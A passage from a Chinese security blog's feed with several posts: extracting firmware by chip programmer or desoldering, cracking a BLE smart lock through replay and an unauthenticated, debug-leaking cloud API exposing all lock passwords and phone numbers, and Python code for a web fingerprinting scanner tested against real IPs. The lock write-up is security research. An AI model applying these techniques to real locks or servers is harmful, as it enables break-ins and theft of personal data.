alt="img"></p><p>识别到芯片为MX25L128，选择其中一种，成功提取固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image63.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image64.jpg" alt="img"></p><p>用binwalk解包固件内容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image117.jpg" alt="img"></p><h2 id="拆焊芯片读取固件"><a href="#拆焊芯片读取固件" class="headerlink" title="拆焊芯片读取固件"></a>拆焊芯片读取固件</h2><p>对于某些机器，芯片引脚采用点锡丝网焊接在背面，引脚太小或没有暴露出引脚，就需要通过拆焊芯片来读取固件了。<br>通过热风枪和锡焊配合，很容易从PCB上把芯片拆焊出来，但在拆焊过程中，可能存在芯片因为过热被损坏，PCB上其他元器件被损坏，电路无法接通等风险，需要酌情考虑。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image92.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image93.jpg" alt="img"></p><h3 id="热风枪和锡焊拆焊芯片读取固件"><a href="#热风枪和锡焊拆焊芯片读取固件" class="headerlink" title="热风枪和锡焊拆焊芯片读取固件"></a>热风枪和锡焊拆焊芯片读取固件</h3><p>设置热风枪温度为400度，拆焊掉的芯片，通过转接座与编程器连接，同样需要注意芯片的引脚方向。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image94.jpg" alt="img"></p><p>读取芯片固件并导出。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image95.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image46.jpg" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。&lt;/p&gt;
&lt;h2 id=&quot;编程器读取&quot;&gt;
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>如何破解一个蓝牙锁</title>
    <link href="http://yaseng.org/how-to-crack-a-ble-lock.html"/>
    <id>http://yaseng.org/how-to-crack-a-ble-lock.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2017-12-27T07:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智能锁中，因为低功耗蓝牙技术的推广，以及受外部环境限制小，通过手机APP交互方便等特点，很多智能锁采用的就是以BLE蓝牙芯片作为控制单元，控制电机或锁簧转动的模式，实现开关锁功能。与其他的安全问题相比，锁具的被破解，可能造成的危害更大，本文通过以破解某型号蓝牙锁，来展示目前蓝牙智能锁可能面临的安全风险。</p><h2 id="蓝牙锁介绍"><a href="#蓝牙锁介绍" class="headerlink" title="蓝牙锁介绍"></a>蓝牙锁介绍</h2><p> 蓝牙锁由于不受外部环境限制，功耗较低，和手机交互方便，目前用的比较多,形状也五花八门，例如目前使用最广泛的一些智能蓝牙锁。</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage9.jpg" alt="img"></p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage10.jpg" alt="img"></p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage11.jpg" alt="img"></p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage12.jpg" alt="img"></p><h2 id="如何去破解一个蓝牙锁"><a href="#如何去破解一个蓝牙锁" class="headerlink" title="如何去破解一个蓝牙锁"></a>如何去破解一个蓝牙锁</h2><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage13.jpg" alt="img"></p><h3 id="目标介绍"><a href="#目标介绍" class="headerlink" title="目标介绍"></a>目标介绍</h3><p>这个属于低功耗蓝牙锁，使用app 绑定之后可以开启，还能共享密码，修改密码。</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage14.jpg" alt="img"></p><h3 id="内部构架"><a href="#内部构架" class="headerlink" title="内部构架"></a>内部构架</h3><p>显微镜查看电路板<br><img src="http://ozuqqvmm5.bkt.clouddn.com/IMG_2214.jpg" alt="img"></p><p>拆解<br><img src="http://ozuqqvmm5.bkt.clouddn.com/IMG_2216.jpg" alt="img"></p><p>蓝牙锁内部搭载了一块CC2541蓝牙芯片，通过控制电机驱动芯片，带动卡榫运转，从而形成拉锁的开关。CC2541是TI推出的一款专门适用于BLE和专用的2.4GHz应用的SOC芯片解决方案,CC254X在目前物联网蓝牙通信解决方案中，市场占有率很高，应用场景非常广泛。</p><h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>使用app初步连接探测，可以看到</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage16.jpg" alt="img"></p><h3 id="开锁流程"><a href="#开锁流程" class="headerlink" title="开锁流程"></a>开锁流程</h3><p>Logcat 查看app日志</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage17.jpg" alt="img"></p><p>流程为</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171123170725.jpg" alt="img"></p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>一般对于蓝牙锁的攻击方式有三种</p><p>1、重放攻击<br>2、暴力破解(6位数字)<br>3、云端漏洞</p><h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage18.jpg" alt="img"></p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage19.jpg" alt="img"></p><p>通过蓝牙抓包分析，发现通信过程没有加密，可以重放获取认证密码，但如果要模拟真实的智能锁攻击场景，显然不能通过如此显眼的方式，真实环境中往往很难有一个给我们抓包或劫持的场景，所以最好的方式是远程无接触开锁，需要去找云端的漏洞。</p><h3 id="云端漏洞"><a href="#云端漏洞" class="headerlink" title="云端漏洞"></a>云端漏洞</h3><p>云端是Thinkphp5 写的，稍微看了一下,存在有两个漏洞。无认证可以遍历所有id拿到所有锁的信息</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage20.jpg" alt="img"></p><p>没有关闭调试模式会泄露信息,传入一个空的id会吧所有锁的信息报错显示出来，泄露所有锁的密码以及绑定的电话号码mac地址等信息。</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage21.jpg" alt="img"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>对于真实的破解锁场景，最好用一个手机app来开锁掩人耳目，综合以上分析，编写一个开锁Android app 。<br>工作流程为</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171123170725.jpg" alt="img"></p><p>利用 com.inuker.bluetooth 库快速开发</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/bimage22.jpg" alt="img"></p><p>APP界面</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/15117578788731.jpg" alt="img"></p><p>视频演示</p><p> <a href="https://v.qq.com/x/page/b051058vicv.html" target="_blank" rel="noopener">https://v.qq.com/x/page/b051058vicv.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>ti官方页面  <a href="http://www.ti.com.cn/product/cn/CC2541" target="_blank" rel="noopener">http://www.ti.com.cn/product/cn/CC2541</a><br>cc2541蓝牙芯片手册  <a href="https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="智能锁" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81/"/>
    
      <category term="蓝牙攻击" scheme="http://yaseng.org/tags/%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>浅谈现代化指纹识别及工具编写</title>
    <link href="http://yaseng.org/yet-another-web-fingerprinter.html"/>
    <id>http://yaseng.org/yet-another-web-fingerprinter.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2017-12-27T08:09:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。</p><h2 id="传统的指纹识别"><a href="#传统的指纹识别" class="headerlink" title="传统的指纹识别"></a>传统的指纹识别</h2><p>一些扫描器里面使用的比较多的都是通过特殊路径  静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/15047737007020.jpg" alt="img"><br>存在几个问题</p><ol><li>效率太低，每一个路径都需要访问一次。容易被waf拦截</li><li>目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 </li></ol><h2 id="现代化指纹识别"><a href="#现代化指纹识别" class="headerlink" title="现代化指纹识别"></a>现代化指纹识别</h2><p>怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header  能识别出80% 的app<br>例如WordPress，discuz  会把独特的cookie放到header 里面。<br>discuz  的关键词  _saltkey=<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15109122240334.jpg" alt="img"></p><p>默认首页也会有很多固定的关键词，  WordPress   wp-conetnt<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15109123220322.jpg" alt="img"></p><p>剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。</p><h2 id="现代化指纹识别方案"><a href="#现代化指纹识别方案" class="headerlink" title="现代化指纹识别方案"></a>现代化指纹识别方案</h2><h3 id="指纹库设计"><a href="#指纹库设计" class="headerlink" title="指纹库设计"></a>指纹库设计</h3><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191426.jpg" alt="img"><br>指纹库类型目前有3种 ，当然后续还需要加上正则。<br>finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如  weblogic 的指纹规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;port&apos;:7001,&apos;url&apos;: &apos;/console/login/LoginForm.jsp&apos;, &apos;code&apos;: 200, &apos;grep&apos;: &apos;WebLogic Server&apos;&#125;</span><br></pre></td></tr></table></figure><p>下面介绍每一种指纹库实例</p><h4 id="指纹规则"><a href="#指纹规则" class="headerlink" title="指纹规则"></a>指纹规则</h4><h5 id="web-header-contain"><a href="#web-header-contain" class="headerlink" title="web_header_contain"></a>web_header_contain</h5><p>首页 response 里面的 header 查找特征符<br>速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。<br>例如 discuz,jboss,wordpress 等。<br>规则编写,以discuz 为例 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  -I    www.cctry.com</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Microsoft-IIS/6.0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Date: Thu, 07 Jan 2016 18:22:34 GMT</span><br><span class="line">Content-Type: text/html; charset=gbk</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Powered-By: PHP/5.2.17</span><br><span class="line">Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponly</span><br><span class="line">Set-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/</span><br><span class="line">Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</span><br><span class="line">Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</span><br><span class="line">X-Daa-Tunnel: hop_count=1</span><br></pre></td></tr></table></figure><p>经过分析,字符串 _saltkey=  为discuz  header 中的规则<br>具体规则如下<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191240.jpg" alt="img"></p><h5 id="web-index-contain"><a href="#web-index-contain" class="headerlink" title="web_index_contain"></a>web_index_contain</h5><p>在缓存的首页里面查找关键词或者正则匹配<br>优先级次之,只需要 get请求一次即可。<br>例如Office Anywhere   指纹 编写流程<br>数据包分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  http://125.91.218.186:8000/   |  grep   <span class="string">'/images/tongda.ico'</span></span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  2001  100  2001    0     0  11795      0 --:--:-- --:--:-- --:--:-- 11840</span><br><span class="line">&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/images/tongda.ico"</span>&gt;</span><br></pre></td></tr></table></figure><p>规则编写<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191233.jpg" alt="img"></p><h5 id="web-url-contain"><a href="#web-url-contain" class="headerlink" title="web_url_contain"></a>web_url_contain</h5><p>特殊url 查找指定的关键词(返回状态码也指定)。<br>优先级最低。<br>例如  weblogic 的指纹 finger 过程<br>数据包分析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  tools  curl  -I     http://202.97.194.9:7001/console/login/LoginForm.jsp</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Date: Thu, 07 Jan 2016 18:53:28 GMT</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Expires: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line">Set-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/</span><br><span class="line">Content-Language: zh-CN</span><br><span class="line">X-Powered-By: Servlet/2.5 JSP/2.1</span><br></pre></td></tr></table></figure><p>规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;url&apos;: &apos;/console/login/LoginForm.jsp&apos;, &apos;code&apos;: 200, &apos;grep&apos;: &apos;WebLogic Server&apos;&#125;</span><br></pre></td></tr></table></figure><p>表<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191224.jpg" alt="img"></p><h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>指纹识别模块代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"> *@Projet  Yafinger</span></span><br><span class="line"><span class="string"> *@Author  yaseng@uauc.net</span></span><br><span class="line"><span class="string"> *@Desc    playweb finger modules</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> ast,time</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_web_app</span><span class="params">(url)</span>:</span></span><br><span class="line">    rsp_index = util.http_get(url)</span><br><span class="line">    str_index = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> rsp_index == <span class="keyword">None</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    list_app=[]</span><br><span class="line">    fingers=config.get(<span class="string">'fingers'</span>);</span><br><span class="line">    <span class="keyword">for</span>  finger  <span class="keyword">in</span>   fingers :</span><br><span class="line">        rule = ast.literal_eval(finger[<span class="string">'finger'</span>])</span><br><span class="line">        <span class="keyword">if</span> finger[<span class="string">'type'</span>] == <span class="string">'web_index_contain'</span>: </span><br><span class="line">            <span class="comment"># limit header and  body and code  exp : &#123;'header':'jsessionid=','code': 200, 'grep': '.action'&#125;</span></span><br><span class="line">            <span class="keyword">if</span> rule.has_key(<span class="string">'header'</span>) <span class="keyword">and</span>  rule[<span class="string">'header'</span>] <span class="keyword">not</span> <span class="keyword">in</span>   str(rsp_index[<span class="string">'headers'</span>]).lower()  : </span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> rsp_index[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_index[<span class="string">'data'</span>] :</span><br><span class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</span><br><span class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url, finger[<span class="string">'app_name'</span>]))</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">elif</span> finger[<span class="string">'type'</span>] == <span class="string">'web_url_contain'</span> :</span><br><span class="line">             rsp_tmp = util.http_get(url + rule[<span class="string">'url'</span>])</span><br><span class="line">             <span class="keyword">if</span> rsp_tmp == <span class="keyword">None</span> :</span><br><span class="line">                 <span class="keyword">continue</span></span><br><span class="line">             <span class="keyword">if</span> rsp_tmp[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_tmp[<span class="string">'data'</span>] :</span><br><span class="line">                 list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</span><br><span class="line">                 util.log(<span class="string">"url:%s app:%s"</span> % (url + rule[<span class="string">'url'</span>], finger[<span class="string">'app_name'</span>]))</span><br><span class="line">        <span class="keyword">elif</span>  finger[<span class="string">'type'</span>] == <span class="string">'web_header_contain'</span> :</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span>  str(rsp_index[<span class="string">'headers'</span>]).lower() :</span><br><span class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</span><br><span class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url , finger[<span class="string">'app_name'</span>]))</span><br><span class="line">                        </span><br><span class="line">            </span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">return</span>  list_app</span><br></pre></td></tr></table></figure><h3 id="单独识别"><a href="#单独识别" class="headerlink" title="单独识别"></a>单独识别</h3><p>简单调用指纹识别模块代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"> *@Projet  Yafinger</span></span><br><span class="line"><span class="string"> *@Author  yaseng@uauc.net</span></span><br><span class="line"><span class="string"> *@Desc    yafinger test </span></span><br><span class="line"><span class="string">     __    __            ___                                         </span></span><br><span class="line"><span class="string">    /\ \  /\ \         /'___\  __                                    </span></span><br><span class="line"><span class="string">    \ `\`\\/'/   __   /\ \__/ /\_\     ___       __       __   _ __  </span></span><br><span class="line"><span class="string">     `\ `\ /'  /'__`\ \ \ ,__\\/\ \  /' _ `\   /'_ `\   /'__`\/\`'__\</span></span><br><span class="line"><span class="string">       `\ \ \ /\ \L\.\_\ \ \_/ \ \ \ /\ \/\ \ /\ \L\ \ /\  __/\ \ \/ </span></span><br><span class="line"><span class="string">         \ \_\\ \__/.\_\\ \_\   \ \_\\ \_\ \_\\ \____ \\ \____\\ \_\ </span></span><br><span class="line"><span class="string">          \/_/ \/__/\/_/ \/_/    \/_/ \/_/\/_/ \/___L\ \\/____/ \/_/ </span></span><br><span class="line"><span class="string">                                                 /\____/             </span></span><br><span class="line"><span class="string">                                                 \_/__/ </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span>   os, time, sys, Queue, threading, ast</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</span><br><span class="line"><span class="keyword">from</span>   lib.db             <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span>   optparse           <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span>   modules            <span class="keyword">import</span> finger</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    usage= <span class="string">'''%prog --host  host --port  port --finger  &lt;all|app_name&gt;   \r\nExample:%prog  --url  http://127.0.0.1    --finger phpmyadmin  '''</span></span><br><span class="line">    parser = OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">"-u"</span>, <span class="string">"--url"</span>, dest=<span class="string">"url"</span>, help=<span class="string">"target url"</span>)</span><br><span class="line">    parser.add_option(<span class="string">"-f"</span>, <span class="string">"--finger"</span>, dest=<span class="string">"finger"</span>, help=<span class="string">"finger_db app_name,default all "</span>, default=<span class="string">"all"</span>)</span><br><span class="line">    options, arguments = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.url == <span class="keyword">None</span> :</span><br><span class="line">        parser.print_help() </span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    db = MySQL(config.db_config)</span><br><span class="line">    sql_finger_where=<span class="string">' '</span>  <span class="keyword">if</span> options.finger == <span class="string">'all'</span> <span class="keyword">else</span> <span class="string">"  and  app_name='%s' "</span>  % options.finger</span><br><span class="line">    db.query(<span class="string">"SELECT  * from  pw_finger_db  where  `enable`=1   %s "</span>  % sql_finger_where)</span><br><span class="line">    fingers = db.fetch_all()</span><br><span class="line">    <span class="keyword">if</span> len(fingers) == <span class="number">0</span> :</span><br><span class="line">        util.log(<span class="string">'finger app_name %s not found'</span> % options.finger ,<span class="number">3</span>,<span class="string">'finger'</span>) </span><br><span class="line">    config.set(<span class="string">"fingers"</span>,fingers)</span><br><span class="line">    util.log(<span class="string">"load fingers count %d"</span> % len(fingers),<span class="number">1</span>,<span class="string">'finger'</span>)</span><br><span class="line">    finger.get_web_app(options.url)</span><br></pre></td></tr></table></figure><p><img src="http://ozuqqvmm5.bkt.clouddn.com/15109322329056.jpg" alt="img"></p><h3 id="批量识别"><a href="#批量识别" class="headerlink" title="批量识别"></a>批量识别</h3><p> 可以使用线程池来实现批量指纹识别。</p><h3 id="指纹结果"><a href="#指纹结果" class="headerlink" title="指纹结果"></a>指纹结果</h3><p>融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。</p><h2 id="yafinger"><a href="#yafinger" class="headerlink" title="yafinger"></a>yafinger</h2><p>yet another  web  fingerprinter<br><a href="https://github.com/yaseng/yafinger" target="_blank" rel="noopener">https://github.com/yaseng/yafinger</a></p><h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ol><li>指纹库需要补充</li><li>可以不局限于web指纹</li><li>某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用
      
    
    </summary>
    
      <category term="web安全" scheme="http://yaseng.org/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="指纹识别" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-硬件分析初探</title>
    <link href="http://yaseng.org/iot-security-hardware-analysis.html"/>
    <id>http://yaseng.org/iot-security-hardware-analysis.html</id>
    <published>2017-11-16T16:00:00.000Z</published>
    <updated>2017-12-27T08:02:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通信的抓包等方式可以获得部分的信息，但如果需要深入分析智能设备底层的工作原理，从中发现更深层次的安全问题，就不可避免的需要直接接触硬件本身，这也是传统安全手段未能触及的部分，据此，下面简单的谈下关于电路分析和芯片固件提取和调试的一点心得。</p><h2 id="电路识别"><a href="#电路识别" class="headerlink" title="电路识别"></a>电路识别</h2><p>在对电路进行分析之前，需要对PCB电路图和电子元器件知识有简单的了解。<br>PCB（ Printed Circuit Board），中文名称为印制电路板，又称印刷线路板，是重要的电子部件，是电子元器件的支撑体，是电子元器件电气连接的载体。由于它是采用电子印刷术制作的，故被称为“印刷”电路板。<br><img src="/images/image11.jpg" alt="img"><br><img src="/images/image12.jpg" alt="img"><br><img src="/images/image13.jpg" alt="img"></p><h2 id="电子元器件"><a href="#电子元器件" class="headerlink" title="电子元器件"></a>电子元器件</h2><p>电子元件有着不同的封装类型，不同类的元件外形一样，但内部结构及用途是大不一样的，比如TO220封装的元件可能是三极管、可控硅、场效应管、或双二极管。TO-3封装的元件有三极管，集成电路等。二极管也有几种封装，玻璃封装、塑料封装及螺栓封装，二极管品种有稳压二极管、整流二极管、隧道二极管、快恢复二极管、微波二极管、肖特基二极管等，这些二极管都用一种或几种封装。贴片元件由于元件微小有的干脆不印字常用尺寸大多也就几种，所以没有经验的人很难区分，但贴片二极管及有极性贴片电容与其它贴片则很容易区分，有极性贴片元件有一个共同的特点，就是极性标志。对于元件识别可以看印字型号来区别，对于元件上没有字符的器件也可分析电路原理或用万用表测量元件参数进行判断。判断元件类型并非一朝一夕就能学会的，这需要多年积累的经验来认识。<br><img src="/images/image14.jpg" 